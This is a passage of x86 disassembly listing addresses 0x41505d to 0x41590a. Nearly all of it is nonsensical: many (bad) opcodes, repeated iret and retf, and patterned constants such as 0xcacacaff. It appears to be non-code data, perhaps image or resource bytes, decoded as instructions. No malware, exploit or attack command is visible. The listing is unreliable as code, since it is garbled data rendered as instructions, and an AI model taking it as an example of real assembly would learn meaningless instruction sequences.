  41505d:	mov    dh,0xff
  415060:	iret   
  415061:	iret   
  415062:	iret   
  415063:	(bad)  
  415064:	fcmovu st,st(2)
  415066:	(bad)  
  415068:	fcmovnu st,st(3)
  41506a:	(bad)  
  41506c:	iret   
  41506d:	iret   
  41506e:	iret   
  41506f:	inc    edi
  415071:	mov    edi,0xcacacaff
  415077:	inc    esi
  415079:	mov    dh,0xff
  41507c:	mov    ecx,0x9effb9b9
  415081:	sahf   
  415082:	sahf   
  415083:	dec    DWORD PTR [esi-0x36007172]
  415089:	leave  
  41508a:	leave  
  41508b:	jmp    DWORD PTR [ecx]
  41508d:	and    DWORD PTR [ecx],esp
  41508f:	jno    0x415091
  415091:	add    BYTE PTR [eax],al
  415093:	and    DWORD PTR [eax],eax
  415095:	add    BYTE PTR [eax],al
  415097:	xor    al,BYTE PTR [eax]
  415099:	add    BYTE PTR [eax],al
  41509b:	pop    ds
  41509c:	add    BYTE PTR [eax],al
  41509e:	add    BYTE PTR [edx],dl
	...
  4150d0:	(bad)
  4150d3:	loope  0x4150a3
  4150d5:	into   
  4150d6:	into   
  4150d7:	(bad)  
  4150d8:	mov    edi,0xbfffbfbf
  4150dd:	mov    edi,0xc9c9ffbf
  4150e2:	leave  
  4150e3:	call   eax
  4150e5:	rcl    al,1
  4150e7:	call   edx
  4150e9:	rcl    ah,cl
  4150eb:	dec    edi
  4150ed:	iret   
  4150ee:	iret   
  4150ef:	inc    esi
  4150f1:	mov    dh,0xff
  4150f4:	mov    esi,0xa2ffbebe
  4150f9:	mov    ds:0x8585ffa2,al
  4150fe:	test   edi,edi
  415100:	test   BYTE PTR [esp+eax*4-0x64646401],al
  415107:	call   DWORD PTR [ebp+0xef9595]
  41510d:	add    BYTE PTR [eax],al
  41510f:	pop    ss
  415110:	or     al,0xc
  415112:	or     al,0x18
  415114:	or     BYTE PTR [eax],cl
  415116:	or     DWORD PTR ds:0x13000000,edx
  41511c:	add    BYTE PTR [eax],al
  41511e:	add    BYTE PTR [eax+eax*1],cl
  415121:	add    BYTE PTR [eax],al
  415123:	add    BYTE PTR [ecx],bh
  415125:	cmp    edi,DWORD PTR [edx+ebx*1]
  415128:	push   ebp
  415129:	push   ebp
  41512a:	push   edi
  41512b:	enter  0x8789,0x87
  41512f:	call   DWORD PTR [ecx+0x50]
  415132:	push   eax
  415133:	sahf   
  415134:	add    DWORD PTR [ecx],eax
  415136:	add    DWORD PTR [edx],edi
  415138:	add    BYTE PTR [eax],al
  41513a:	add    BYTE PTR [esi],dh
  41513c:	adc    edx,DWORD PTR [ebx]
  41513e:	adc    esi,DWORD PTR [ecx+0x14]
  415141:	adc    al,0x14
  415143:	fs inc ebx
  415145:	inc    ebx
  415146:	inc    ecx
  415147:	or     eax,0x0
	...
  415154:	mov    DWORD PTR [ecx-0x2c2c5c77],ecx
  41515a:	aam    0xff
  41515c:	retf   
  41515d:	retf   
  41515e:	retf   
  41515f:	push   DWORD PTR [esi-0x4f004a4a]
  415165:	mov    al,0xb0
  415167:	jmp    FWORD PTR [edi-0x65005251]
  41516d:	cdq    
  41516e:	cdq    
  41516f:	inc    DWORD PTR [ebx+0x6aff8384]
  415175:	push   0x6a
  415177:	call   DWORD PTR [ebx+0x52]
  41517a:	push   edx
  41517b:	jmp    DWORD PTR [edi+0x67]
  41517e:	call   DWORD PTR [di-0x6c6d]
  415183:	push   DWORD PTR [esp+esi*4-0x5e5b004b]
  41518a:	mov    eax,ds:0xa4a2a5de
  41518f:	fcmovnb st,st(3)
  415191:	ret    
  415192:	(bad)  
  415193:	call   FWORD PTR [edi+0x5f]
  415196:	pop    ebp
  415197:	pop    edx
  415198:	add    BYTE PTR [eax],al
  41519a:	add    BYTE PTR [eax],al
  41519c:	add    BYTE PTR [eax],al
  41519e:	add    BYTE PTR ds:0x0,al
  4151a4:	jge    0x415222
  4151a6:	jge    0x415170
  4151a8:	sahf   
  4151a9:	fwait
  4151aa:	cdq    
  4151ab:	push   DWORD PTR [edi-0x1f004e4e]
  4151b1:	loopne 0x415194
  4151b3:	call   FWORD PTR [ebx+0x47ff9b9b]
  4151b9:	inc    edi
  4151ba:	inc    edi
  4151bb:	sti    
  4151bc:	push   0xa5ff6868
  4151c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151c3:	clc    
  4151c4:	lea    ecx,[ebp+0x1e1eda8b]
  4151ca:	sbb    eax,0x4d4c4c73
  4151cf:	push   cs
	...
  4151d8:	and    DWORD PTR [eax],esp
  4151da:	push   ds
  4151db:	dec    ecx
  4151dc:	jb     0x415250
  4151de:	jo     0x41519e
  4151e0:	fwait
  4151e1:	fwait
  4151e2:	fwait
  4151e3:	out    dx,al
  4151e4:	pushf  
  4151e5:	call   0xff75:0x7777ff99
  4151ec:	jae    0x41525e
  4151ee:	jae    0x4151ef
  4151f0:	je     0x415263
  4151f2:	je     0x4151f3
  4151f4:	add    BYTE PTR [ecx-0x6061007d],0xa1
  4151fb:	jmp    FWORD PTR [ebx-0x4800494e]
  415201:	(bad)  
  415202:	retf   
  415203:	inc    eax
  415205:	(bad)  
  415207:	dec    edi
  415209:	jmp    0xe51e51fa
  41520e:	out    0xff,al
  415210:	rcl    ebx,cl
  415212:	aam    0xff
  415214:	pop    esi
  415215:	pop    esi
  415216:	pop    esi
  415217:	add    BYTE PTR [eax],0x0
	...
  415222:	add    BYTE PTR [eax],al
  415224:	lea    ecx,[ebp+ecx*4-0x4b484417]
  41522b:	dec    DWORD PTR [esi-0x52007173]
  415231:	lods   eax,DWORD PTR ds:[esi]
  415232:	scas   al,BYTE PTR es:[edi]
  415233:	call   edx
  415235:	aam    0xd2
  415237:	inc    esp
  415239:	(bad)  
  41523a:	(bad)  
  41523b:	call   DWORD PTR [eax+0x52ec9190]
  415241:	push   edx
  415242:	push   edx
  415243:	mov    edx,0xc87a7979
  415248:	lods   al,BYTE PTR ds:[esi]
  415249:	lods   al,BYTE PTR ds:[esi]
  41524a:	lods   eax,DWORD PTR ds:[esi]
  41524b:	stc    
  41524c:	mov    BYTE PTR [eax+0x2b2be68a],cl
  415252:	sub    edi,DWORD PTR [ecx+0x0]
  415255:	add    BYTE PTR [eax],al
  415257:	or     al,BYTE PTR [eax]
  415259:	add    BYTE PTR [eax],al
  41525b:	add    BYTE PTR [ebx],dh
  41525d:	xor    DWORD PTR ds:0x6663631f,esi
  415263:	test   BYTE PTR [edx-0x77026b71],cl
  415269:	xchg   ecx,eax
  41526a:	cwde   
  41526b:	dec    DWORD PTR [esp+ebx*4-0x5068005d]
  415272:	mov    bh,0xff
  415274:	mov    ecx,0xcbffd9d3
  415279:	in     al,0xe5
  41527b:	call   eax
  41527d:	fsubrp st(0),st
  41527f:	call   ebp
  415281:	rcl    al,cl
  415283:	call   esp
  415285:	mov    cl,0xa7
  415287:	call   ecx
  415289:	jl     0x415305
  41528b:	dec    ebx
  41528d:	mov    esp,0xc8bbffb6
  415292:	enter  0x93ff,0x93
  415296:	xchg   ecx,eax
  415297:	cwde   
	...
  4152a4:	xchg   DWORD PTR [ebp-0x453f267b],eax
  4152aa:	mov    ebx,0xa4a1a4ff
  4152af:	jmp    FWORD PTR [ebp-0x51005354]
  4152b5:	scas   al,BYTE PTR es:[edi]
  4152b6:	lods   eax,DWORD PTR ds:[esi]
  4152b7:	jmp    FWORD PTR [edx-0x30005657]
  4152bd:	iret   
  4152be:	iret   
  4152bf:	call   edi
  4152c1:	xlat   BYTE PTR ds:[ebx]
  4152c2:	xlat   BYTE PTR ds:[ebx]
  4152c3:	dec    DWORD PTR [ebx+ecx*4+0x5153dd8c]
  4152ca:	push   edx
  4152cb:	loope  0x415251
  4152cd:	add    DWORD PTR [edi+edi*8-0xe919396],0xffffff8d
  4152d5:	xchg   esi,eax
  4152d6:	call   0xb5ff:0xc7c2b1ed
  4152dd:	int    0xd4
  4152df:	jmp    FWORD PTR [eax+ecx*8-0x34510032]
  4152e6:	int3   
  4152e7:	(bad)  
  4152e8:	mov    ebp,0xc5ffc8c6
  4152ed:	mov    bh,0xb5
  4152ef:	inc    edi
  4152f1:	lods   al,BYTE PTR ds:[esi]
  4152f2:	stos   BYTE PTR es:[edi],al
  4152f3:	dec    eax
  4152f5:	xchg   esi,eax
  4152f6:	mov    ?,edi
  4152f8:	lds    ebp,FWORD PTR [ecx+0x59]
  4152fb:	(bad)  
  4152fc:	mov    ebx,0xafff1e2d
  415301:	add    eax,0xa3ff00
  415306:	add    bh,bh
  415308:	cdq    
  415309:	add    BYTE PTR [eax],al
  41530b:	(bad)  
  41530c:	mov    esp,0xc3ff848a
  415311:	loopne 0x4152f7
  415313:	call   FWORD PTR [eax+0xb59494]
	...
  415321:	add    BYTE PTR [eax],al
  415323:	add    BYTE PTR [edx+ecx*4-0x3b352375],cl
  41532a:	(bad)  
  41532d:	mov    ds:0xadacffa5,eax
  415332:	scas   al,BYTE PTR es:[edi]
  415333:	jmp    DWORD PTR [edx-0x6d005b5c]
  415339:	xchg   ecx,eax
  41533a:	xchg   ecx,eax
  41533b:	call   DWORD PTR [ecx+0x7fff928e]
  415341:	mov    WORD PTR [esi-0x514b6901],cs
  415347:	(bad)  
  415348:	mov    ecx,0xd4ffd3ce
  41534d:	out    dx,al
  41534e:	hlt    
  41534f:	(bad)  
  415350:	fdiv   st(3),st
  415352:	std    
  415353:	call   eax
  415355:	loope  0x41533a
  415357:	inc    esi
  415359:	rol    al,0xff
  41535c:	mov    esp,0xbbff9e9f
  415361:	jge    0x4153d8
  415363:	push   DWORD PTR [ebp+ebx*2+0x35abff5d]
  41536a:	xor    edi,edi
  41536c:	mov    al,ds:0xa0ff000c
  415371:	add    BYTE PTR [eax],al
  415373:	jmp    DWORD PTR [ecx-0x5d010000]
  415379:	add    BYTE PTR [eax],al
  41537b:	jmp    DWORD PTR [ebx+ecx*1+0x1dabff00]
  415382:	or     bh,bh
  415384:	mov    dl,0x2c
  415386:	sbb    bh,bh
  415388:	mov    bh,0x16
  41538a:	add    bh,bh
  41538c:	(bad)  
  41538d:	mov    DWORD PTR [eax-0x15193901],eax
  415393:	call   DWORD PTR [edx+0xcc8e8f]
	...
  4153a1:	add    BYTE PTR [eax],al
  4153a3:	add    BYTE PTR [ecx-0x2d1f7173],dl
  4153a9:	int    0xcc
  4153ab:	jmp    DWORD PTR [esi-0x51005e5e]
  4153b1:	lods   al,BYTE PTR ds:[esi]
  4153b2:	scas   eax,DWORD PTR es:[edi]
  4153b3:	jmp    FWORD PTR [ecx-0x68005657]
  4153b9:	xchg   edi,eax
  4153ba:	xchg   edi,eax
  4153bb:	jmp    FWORD PTR [eax-0x58005359]
  4153c1:	mov    ch,0xb6
  4153c3:	inc    eax
  4153c5:	iret   
  4153c6:	retf   0xbaff
  4153c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153cb:	push   DWORD PTR [eax-0x5d008d8c]
  4153d1:	push   eax
  4153d2:	push   edx
  4153d3:	call   FWORD PTR [eax-0x7100cccb]
  4153d9:	adc    DWORD PTR [eax],edx
  4153db:	inc    DWORD PTR [ebp-0x7e010000]
  4153e1:	add    BYTE PTR [eax],al
  4153e3:	inc    DWORD PTR [ebx-0x7200feff]
  4153e9:	add    BYTE PTR [eax],al
  4153eb:	call   FWORD PTR [edx-0x5000fffe]
  4153f1:	xor    DWORD PTR ds:0x2b3db7ff,ebx
  4153f7:	(bad)  
  4153f8:	mov    ebx,0xbfff293c
  4153fd:	aas    
  4153fe:	sub    eax,0x2d41c2ff
  415403:	inc    esi
  415405:	inc    ebx
  415406:	sub    al,0xff
  415408:	enter  0x1029,0xff
  41540c:	int3   
  41540d:	je     0x415476
  41540f:	inc    esi
  415411:	jmp    0x93d95403
  415416:	xchg   edx,eax
  415417:	(bad)  
	...
  415424:	xchg   ebx,eax
  415425:	(bad)  
  415426:	xchg   edx,eax
  415427:	loope  0x415403
  415429:	rcl    dl,cl
  41542b:	jmp    DWORD PTR [esi-0x53005a5c]
  415431:	scas   al,BYTE PTR es:[edi]
  415432:	scas   eax,DWORD PTR es:[edi]
  415433:	jmp    FWORD PTR [edx+ebp*4-0x63630054]
  41543a:	pushf  
  41543b:	inc    edx
  41543d:	rcl    edi,cl
  41543f:	call   DWORD PTR [eax-0x7100bbbd]
  415445:	adc    al,0x17
  415447:	dec    DWORD PTR [esp+ecx*1+0x7cff05]
  41544e:	add    bh,bh
  415450:	je     0x415452
  415452:	add    bh,bh
  415454:	jne    0x415456
  415456:	add    bh,bh
  415458:	jnp    0x41545a
  41545a:	add    bh,bh
  41545c:	mov    DWORD PTR [ebx],eax
  41545e:	add    bh,bh
  415460:	ja     0x415484
  415462:	sbb    edi,edi
  415464:	outs   dx,DWORD PTR ds:[esi]
  415465:	sub    esp,DWORD PTR [edx]
  415467:	call   FWORD PTR [ecx-0x5200fff0]
  41546d:	sbb    BYTE PTR [ecx],al
  41546f:	inc    eax
  415471:	dec    eax
  415472:	cmp    edi,edi
  415474:	lds    ecx,FWORD PTR [ebp+edi*1-0x1]
  415478:	retf   0x3a4b
  41547b:	dec    esi
  41547d:	dec    edi
  41547e:	cmp    al,0xff
  415480:	rcl    DWORD PTR [edx+0x3e],1
  415483:	call   esp
  415485:	push   esi
  415486:	inc    ecx
  415487:	call   esi
  415489:	inc    esp
  41548a:	sub    eax,0x5367d2ff
  41548f:	dec    edx
  415491:	out    0xeb,al
  415493:	call   FWORD PTR [ebp-0x6c196162]
  415499:	xchg   ebx,eax
  41549a:	xchg   ebx,eax
  41549b:	adc    al,BYTE PTR [eax]
  41549d:	add    BYTE PTR [eax],al
  41549f:	add    BYTE PTR [eax],al
  4154a1:	add    BYTE PTR [eax],al
  4154a3:	add    BYTE PTR [ecx-0x211e6d6f],dl
  4154a9:	(bad)  
  4154aa:	fdivr  st,st(7)
  4154ac:	test   al,0xa6
  4154ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154af:	jmp    FWORD PTR [esi-0x4e005150]
  4154b5:	mov    al,0xb1
  4154b7:	jmp    DWORD PTR [eax-0x38005f60]
  4154bd:	fcmovu st,st(7)
  4154bf:	inc    DWORD PTR [ecx+0x7fff272b]
  4154c5:	add    BYTE PTR [eax],al
  4154c7:	dec    DWORD PTR [ebp-0x7400f6eb]
  4154cd:	sbb    BYTE PTR [edi],cl
  4154cf:	dec    DWORD PTR [ebx-0x7600f3e9]
  4154d5:	adc    BYTE PTR ds:0x1090ff,al
  4154db:	(bad)  
  4154dc:	jns    0x415502
  4154de:	sbb    bh,bh
  4154e0:	mov    cl,0xa7
  4154e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154e3:	push   DWORD PTR [esp+esi*4+0x1e76ffb4]
  4154ea:	push   ss
  4154eb:	push   DWORD PTR [ebp-0x2e00f4e2]
  4154f1:	gs push edx
  4154f3:	call   ebx
  4154f5:	fs push edx
  4154f7:	call   edi
  4154f9:	bound  ecx,QWORD PTR [esi-0x1]
  4154fc:	fisub  DWORD PTR [eax+edx*2-0x1]
  415500:	frstor [edi+0x52]
  415503:	jmp    eax
  415505:	imul   edx,DWORD PTR [ebp-0x1],0xff475fe6
  41550c:	in     al,0x68
  41550e:	push   edx
  41550f:	call   eax
  415511:	in     eax,0xe6
  415513:	jmp    DWORD PTR [edx-0x6b005658]
  415519:	nop
  41551a:	nop
  41551b:	add    BYTE PTR cs:[eax],al
  41551e:	add    BYTE PTR [eax],al
  415520:	add    BYTE PTR [eax],al
  415522:	add    BYTE PTR [eax],al
  415524:	xchg   ebx,eax
  415525:	nop
  415526:	xchg   edx,eax
  415527:	loope  0x415507
  415529:	aam    0xd5
  41552b:	jmp    DWORD PTR [ebp-0x4f005b5d]
  415531:	scas   eax,DWORD PTR es:[edi]
  415532:	scas   eax,DWORD PTR es:[edi]
  415533:	push   DWORD PTR [esp+esi*4-0x5959004b]
  41553a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41553b:	inc    ebx
  41553d:	rcl    dl,1
  41553f:	dec    DWORD PTR [edi-0x7100a7a3]
  415545:	adc    ecx,DWORD PTR [eax]
  415547:	call   FWORD PTR [eax-0x6c00d6d1]
  41554d:	daa    
  41554e:	and    bh,bh
  415550:	xchg   edx,eax
  415551:	sub    BYTE PTR ds:0x71391ff,bl
  415557:	(bad)  
  415558:	js     0x415577
  41555a:	pop    ss
  41555b:	inc    ebp
  41555d:	mov    bh,0xb5
  41555f:	(bad)  
  415560:	(bad)  
  415562:	(bad)  
  415564:	(bad)
  415567:	call   FWORD PTR [ebp-0x5c007878]
  41556d:	sub    edx,DWORD PTR [esi]
  41556f:	(bad)  
  415570:	fnstsw WORD PTR [edx+0x6b]
  415573:	(bad)  
  415574:	fnsave [edx+eiz*2-0x1]
  415578:	loopne 0x4155ee
  41557a:	(bad)  
  41557b:	jmp    ebx
  41557d:	ja     0x4155e2
  41557f:	jmp    esi
  415581:	js     0x4155e7
  415583:	(bad)  
  415584:	jmp    0xec40be04
  415589:	ja     0x4155e9
  41558b:	(bad)  
  41558c:	in     al,dx
  41558d:	jo     0x4155e9
  41558f:	call   ebx
  415591:	fsubrp st(1),st
  415593:	jmp    FWORD PTR [ecx-0x6d004d4f]
  415599:	xchg   ecx,eax
  41559a:	xchg   ecx,eax
  41559b:	dec    ecx
	...
  4155a4:	xchg   edx,eax
  4155a5:	mov    ss,WORD PTR [eax-0x32322e1f]
  4155ab:	call   FWORD PTR [ebp-0x4d006465]
  4155b1:	mov    cl,0xb1
  4155b3:	(bad)  
  4155b4:	mov    edi,0xb3ffc0c0
  4155b9:	mov    bl,0xb3
  4155bb:	dec    eax
  4155bd:	rcl    ebx,1
  4155bf:	call   FWORD PTR [edx-0x7100868a]
  4155c5:	sbb    dl,BYTE PTR [ecx]
  4155c7:	call   FWORD PTR [esi-0x6400cdc6]
  4155cd:	cmp    dh,BYTE PTR [esi]
  4155cf:	call   DWORD PTR [edi+0x7cff2731]
  4155d5:	das    
  4155d6:	sub    bh,bh
  4155d8:	xlat   BYTE PTR ds:[ebx]
  4155d9:	int3   
  4155da:	retf   
  4155db:	push   esi
  4155dd:	div    dh
  4155df:	call   FWORD PTR [ebx-0x4a00a49d]
  4155e5:	xchg   ecx,eax
  4155e6:	mov    edi,edi
  4155e8:	(bad)  
  4155ea:	(bad)  
  4155ec:	nop
  4155ed:	pusha  
  4155ee:	pop    eax
  4155ef:	jmp    edx
  4155f1:	pop    DWORD PTR [edx+0x7485e6ff]
  4155f7:	(bad)  
  4155f8:	jmp    0xec40cb84
  4155fd:	mov    DWORD PTR [edi-0x1],esi
  415600:	out    dx,al
  415601:	mov    bh,BYTE PTR [ecx-0x1]
  415604:	lock lea edi,[edx-0x1]
  415608:	repz (bad) 
  41560a:	jns    0x41560b
  41560c:	hlt    
  41560d:	js     0x415672
  41560f:	call   ebp
  415611:	rcl    cl,cl
  415613:	jmp    FWORD PTR [ebp-0x6e004143]
  415619:	mov    cs,WORD PTR [ebp+0x5d]
  41561f:	add    BYTE PTR [eax],al
  415621:	add    BYTE PTR [eax],al
  415623:	add    BYTE PTR [ecx-0x331e6d72],dl
  415629:	mov    ah,0xbe
  41562b:	call   DWORD PTR [ebp-0x4900757d]
  415631:	mov    edx,0xcbcbffb7
  415636:	retf   
  415637:	(bad)  
  415638:	mov    ebx,0xc6ffbbba
  41563d:	retf   
  41563e:	int    0xff
  415640:	lahf   
  415641:	xchg   edx,eax
  415642:	xchg   esp,eax
  415643:	dec    DWORD PTR [edi-0x5900e5df]
  415649:	dec    ecx
  41564a:	inc    ebx
  41564b:	jmp    FWORD PTR [ebx-0x5b00b3ab]
  415651:	dec    ecx
  415652:	inc    ecx
  415653:	call   esp
  415655:	int3   
  415656:	int3   
  415657:	(bad)  
  415658:	out    dx,al
  415659:	in     al,dx
  41565a:	jmp    0x41565b
  41565c:	xchg   ebx,eax
  41565d:	dec    esi
  41565e:	inc    ebp
  41565f:	jmp    FWORD PTR [ebp-0x5200fce8]
  415665:	ss and edi,edi
  415668:	out    0xdf,eax
  41566a:	(bad)  
  41566c:	fcom   st(6)
  41566e:	(bad)  
  41566f:	jmp    DWORD PTR [edi-0x11008a83]
  415675:	cwde   
  415676:	xchg   edi,edi
  415678:	lock cdq 
  41567a:	mov    edi,edi
  41567c:	repz fwait
  41567e:	mov    bh,bh
  415680:	neg    BYTE PTR [ebp-0x61080074]
  415686:	(bad)  
  415687:	(bad)  
  415688:	cli    
  415689:	mov    ds:0x89fcff91,al
  41568e:	jb     0x41568f
  415690:	loope  0x415656
  415692:	mov    edi,0xd0ccb7ff
  415697:	call   DWORD PTR [ecx+0x678d8d]
  41569d:	add    BYTE PTR [eax],al
  41569f:	add    BYTE PTR [eax],al
  4156a1:	add    BYTE PTR [eax],al
  4156a3:	add    BYTE PTR [edi-0x501e757f],cl
  4156a9:	stos   BYTE PTR es:[edi],al
  4156aa:	test   al,0xff
  4156ac:	xchg   ecx,eax
  4156ad:	fwait
  4156ae:	xchg   ebp,eax
  4156af:	(bad)  
  4156b0:	mov    ebp,0xcdffbbb4
  4156b5:	ror    dh,1
  4156b7:	(bad)  
  4156b8:	mov    edi,0xc1ffbfbd
  4156bd:	(bad)
  4156c0:	mov    al,0xb6
  4156c2:	mov    edx,0x212a8eff
  4156c7:	jmp    FWORD PTR [esi-0x4c00b0aa]
  4156cd:	pusha  
  4156ce:	push   edi
  4156cf:	call   DWORD PTR [ebp-0x5b00ede7]
  4156d5:	push   eax
  4156d6:	dec    edx
  4156d7:	call   DWORD PTR [esi+esi*1+0x16aaff28]
  4156de:	add    edi,edi
  4156e0:	mov    bh,0x17
  4156e2:	add    bh,bh
  4156e4:	rcr    BYTE PTR [ecx],0x1
  4156e7:	push   DWORD PTR [ebx-0x9a98]
  4156ed:	(bad)  
  4156ee:	(bad)  
  4156ef:	(bad)  
  4156f0:	mov    ecx,0xcbffaeb0
  4156f5:	mov    edi,DWORD PTR [edi-0x1]
  4156f8:	cmc    
  4156f9:	test   al,0x99
  4156fb:	(bad)  
  4156fc:	clc    
  4156fd:	stos   BYTE PTR es:[edi],al
  4156fe:	fwait
  4156ff:	(bad)  
  415700:	cli    
  415701:	lods   eax,DWORD PTR ds:[esi]
  415702:	pushf  
  415703:	(bad)  
  415704:	std    
  415705:	scas   al,BYTE PTR es:[edi]
  415706:	popf   
  415707:	(bad)  
  415708:	push   DWORD PTR [ecx-0x6600005b]
  41570e:	cmp    edi,0xffffffed
  415711:	mov    edi,0xd0bcffb7
  415716:	fdivr  st,st(7)
  415718:	xchg   ecx,eax
  415719:	mov    cs,WORD PTR [ebp+0x81]
  41571f:	add    BYTE PTR [eax],al
  415721:	add    BYTE PTR [eax],al
  415723:	add    BYTE PTR [esi-0x72],dh
  415726:	sbb    ebp,0x15
  415729:	repnz test edi,edi
  41572c:	dec    ebx
  41572d:	(bad)  
  41572e:	mov    ?,edi
  415730:	fild   QWORD PTR [eax-0x282e003c]
  415736:	aam    0xff
  415738:	(bad)
  41573b:	inc    edi
  41573d:	enter  0xffc9,0xba
  415741:	retf   0xffce
  415744:	xchg   ecx,eax
  415745:	xor    DWORD PTR ds:0x6067b8ff,ebp
  41574b:	push   DWORD PTR [eax-0x6f00b6ae]
  415751:	add    BYTE PTR [eax],al
  415753:	jmp    DWORD PTR [ebx+edx*1+0x15aaff00]
  41575a:	add    bh,bh
  41575c:	mov    ah,0x18
  41575e:	add    bh,bh
  415760:	ret    0x1c
  415763:	dec    ecx
  415765:	sbb    al,BYTE PTR [eax]
  415767:	inc    ebp
  415769:	pop    ds
  41576a:	push   cs
  41576b:	call   ebp
  41576d:	mov    bl,0xff
  415770:	std    
  415771:	std    
  415772:	std    
  415773:	jmp    FWORD PTR [eax-0xd007471]
  415779:	mov    cl,0xa3
  41577b:	(bad)  
  41577c:	std    
  41577d:	mov    ebx,0xbdfeffac
  415782:	lods   eax,DWORD PTR ds:[esi]
  415783:	(bad)  
  415784:	(bad)  
  415785:	mov    edi,0xc3ffffae
  41578a:	mov    dh,0xff
  41578c:	push   DWORD PTR [edx-0x3d0f0066]
  415792:	mov    ch,0xff
  415794:	rcl    ah,0xda
  415797:	call   DWORD PTR [eax+0xb98b8d]
  41579d:	add    BYTE PTR [eax],al
  41579f:	add    BYTE PTR [eax],al
  4157a1:	add    BYTE PTR [eax],al
  4157a3:	add    BYTE PTR [eax-0x7f],ch
  4157a6:	jbe    0x415780
  4157a8:	add    BYTE PTR [ebx+0x39],bh
  4157ab:	jmp    DWORD PTR [edx+0x78]
  4157ae:	imul   edi,edi,0xffd0c4d8
  4157b4:	xlat   BYTE PTR ds:[ebx]
  4157b5:	(bad)  
  4157b7:	dec    edx
  4157b9:	retf   0xffca
  4157bc:	int    0xcd
  4157be:	into   
  4157bf:	(bad)  
  4157c0:	mov    esp,0x93ffd1ce
  4157c5:	xor    al,0x31
  4157c7:	(bad)  
  4157c8:	mov    esi,0xa2ff6870
  4157cd:	sub    esp,DWORD PTR [eax]
  4157cf:	call   FWORD PTR [ebx-0x5100ffff]
  4157d5:	sbb    BYTE PTR [eax],al
  4157d7:	(bad)  
  4157d8:	mov    esi,0xcaff0019
  4157dd:	sbb    eax,0x24d6ff00
  4157e2:	add    bh,bh
  4157e4:	loopne 0x4157fc
  4157e6:	add    bh,bh
  4157e8:	lock sub al,0x4
  4157eb:	call   ebp
  4157ed:	lods   eax,DWORD PTR ds:[esi]
  4157ee:	mov    ds:0xdcdde0ff,eax
  4157f3:	jmp    eax
  4157f5:	loopne 0x4157d7
  4157f7:	jmp    DWORD PTR [edi-0x7d76]
  4157fd:	into   
  4157fe:	mov    ebx,0xbcccffff
  415803:	(bad)  
  415804:	dec    edi
  415806:	mov    ebp,0xc5d5ffff
  41580b:	(bad)  
  41580c:	dec    ecx
  41580e:	mov    cl,0xff
  415810:	hlt    
  415811:	ret    
  415812:	lods   eax,DWORD PTR ds:[esi]
  415813:	inc    ebp
  415815:	aam    0xdc
  415817:	call   DWORD PTR [ecx-0x681f7071]
  41581d:	xchg   edi,eax
  41581e:	xchg   edi,eax
  41581f:	or     eax,DWORD PTR [eax]
  415821:	add    BYTE PTR [eax],al
  415823:	add    BYTE PTR [edx+ebp*2+0x71],dh
  415827:	in     al,0x47
  415829:	es sub eax,0x675f7aff
  41582f:	inc    eax
  415831:	mov    bh,0xff
  415834:	xlat   BYTE PTR ds:[ebx]
  415835:	fcomp  st(0)
  415837:	inc    ebx
  415839:	ret    
  41583a:	ret    
  41583b:	call   eax
  41583d:	rcl    cl,1
  41583f:	(bad)  
  415840:	mov    esi,0x95ffd3d0
  415845:	inc    edx
  415846:	cmp    eax,0x5461b7ff
  41584b:	call   FWORD PTR [ecx+ecx*1+0xfaaff00]
  415852:	add    bh,bh
  415854:	mov    bh,0x19
  415856:	add    bh,bh
  415858:	les    ebx,FWORD PTR [eax+eax*1]
  41585b:	call   eax
  41585d:	and    BYTE PTR [eax],al
  41585f:	(bad)  
  415860:	(bad)  [esi]
  415862:	add    bh,bh
  415864:	out    0xe,eax
  415866:	add    bh,bh
  415868:	hlt    
  415869:	dec    edx
  41586a:	sub    bh,bh
  41586c:	(bad)  
  41586d:	loopne 0x415847
  41586f:	inc    esp
  415871:	scas   al,BYTE PTR es:[edi]
  415872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415873:	(bad)  
  415874:	(bad)  
  415876:	fdivp  st(7),st
  415878:	mov    esi,0xbdffbabb
  41587d:	mov    eax,ds:0xd8ffff96
  415882:	enter  0xffff,0xd9
  415886:	leave  
  415887:	(bad)  
  415888:	(bad)  
  415889:	fcmovne st,st(6)
  41588b:	(bad)  
  41588c:	(bad)  
  41588d:	fadd   st,st(3)
  41588f:	(bad)  
  415890:	stc    
  415891:	ret    0xffa9
  415894:	retf   
  415895:	xlat   BYTE PTR ds:[ebx]
  415896:	(bad)  
  415898:	xchg   ebx,eax
  415899:	xchg   esi,eax
  41589a:	xchg   edi,eax
  41589b:	not    BYTE PTR [esi+0x189596]
  4158a1:	add    BYTE PTR [eax],al
  4158a3:	add    BYTE PTR [esi+0x7a9e8d8b],cl
  4158a9:	je     0x415922
  4158ab:	jmp    FWORD PTR [ebp-0xa005354]
  4158b1:	idiv   cl
  4158b3:	(bad)  
  4158b4:	(bad)  
  4158b5:	(bad)  
  4158b6:	(bad)  
  4158b7:	jmp    ecx
  4158b9:	loope  0x41589c
  4158bb:	call   edi
  4158bd:	xlat   BYTE PTR ds:[ebx]
  4158be:	xlat   BYTE PTR ds:[ebx]
  4158bf:	inc    ecx
  4158c1:	rcl    bh,cl
  4158c3:	call   FWORD PTR [ebx-0x5e00aca8]
  4158c9:	sub    BYTE PTR [ecx],bl
  4158cb:	call   FWORD PTR [edi-0x5000fffc]
  4158d1:	pop    ss
  4158d2:	add    bh,bh
  4158d4:	mov    ebx,0xc7ff001a
  4158d9:	sbb    eax,0x20d3ff00
  4158de:	add    bh,bh
  4158e0:	fbld   TBYTE PTR [esi]
  4158e2:	add    bh,bh
  4158e4:	jmp    0x4158ef
  4158e6:	add    bh,bh
  4158e8:	sti    
  4158e9:	ja     0x415948
  4158eb:	(bad)  
  4158ec:	push   ecx
  4158ee:	out    dx,eax
  4158ef:	(bad)  
  4158f0:	clc    
  4158f1:	aad    0xc8
  4158f3:	inc    eax
  4158f5:	mov    bl,0xaf
  4158f7:	call   esp
  4158f9:	aam    0xd4
  4158fb:	jmp    DWORD PTR [edi-0x36005e5d]
  415901:	mov    bl,0xa8
  415903:	(bad)  
  415904:	cld    
  415905:	(bad)  
  415907:	(bad)  
  415908:	jmp    esp
  41590a:	(bad)  
